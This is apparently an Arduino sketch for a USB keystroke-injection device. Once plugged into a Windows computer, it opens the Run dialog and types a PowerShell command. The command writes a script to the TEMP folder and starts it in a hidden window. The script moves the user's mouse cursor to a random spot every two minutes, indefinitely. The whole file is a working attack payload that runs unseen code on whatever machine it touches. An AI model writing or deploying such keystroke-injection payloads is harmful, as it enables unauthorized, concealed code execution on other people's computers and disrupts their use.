#include <Keyboard.h>

void t(const char* s) { for(int i=0;s[i];i++){Keyboard.write(s[i]);delay(5);} }
void ln(const char* s) { t(s); Keyboard.write(KEY_RETURN); delay(30); }

void setup() {
  delay(2500); Keyboard.begin(); delay(500);
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r');
  delay(100); Keyboard.releaseAll(); delay(800);
  t("powershell"); Keyboard.write(KEY_RETURN); delay(2000);
  ln("'Add-Type -A System.Windows.Forms;while(1){sleep 120;[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point((Get-Random -Min 0 -Max 2560),(Get-Random -Min 0 -Max 1600))}' | Set-Content $env:TEMP\\j.ps1;Start-Process powershell -WindowStyle Hidden -ArgumentList \"-File\",$env:TEMP\\j.ps1;exit");
  Keyboard.end();
}
void loop() {}
